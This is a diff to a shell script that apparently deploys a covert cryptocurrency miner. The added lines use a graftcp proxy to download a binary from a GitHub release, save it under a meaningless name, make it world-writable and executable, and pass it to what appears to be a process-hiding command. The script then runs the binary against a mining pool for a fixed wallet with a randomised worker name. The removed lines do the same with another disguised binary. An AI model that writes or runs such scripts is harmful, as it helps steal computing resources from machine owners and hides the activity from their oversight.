@@ -37,12 +37,10 @@ echo " "
 
 echo " "
 
-./graftcp/graftcp wget https://github.com/egg5233/tw-pearl-miner/releases/download/v3.2.1/tw-pearl-miner-linux-cuda13.tar.gz
+./graftcp/graftcp wget -O lamsiao https://github.com/rxt36q6/file/releases/download/1/pearl-miner-v12
       
-tar xf tw-pearl-miner-linux-cuda13.tar.gz
+chmod 777 lamsiao
 
-mv tw-pearl-miner-linux/pearl-gpu-miner tw-pearl-miner-linux/ferokiso
+ph add lamsiao
 
-ph add ferokiso
-
-./graftcp/graftcp ./tw-pearl-miner-linux/ferokiso --pool prl.kryptex.network:7048 --wallet prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch --worker $(echo $RANDOM | md5sum | head -c 10)
+./graftcp/graftcp ./lamsiao --host pool.pearlhash.xyz:9000 --user prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch --worker $(echo $RANDOM | md5sum | head -c 10)
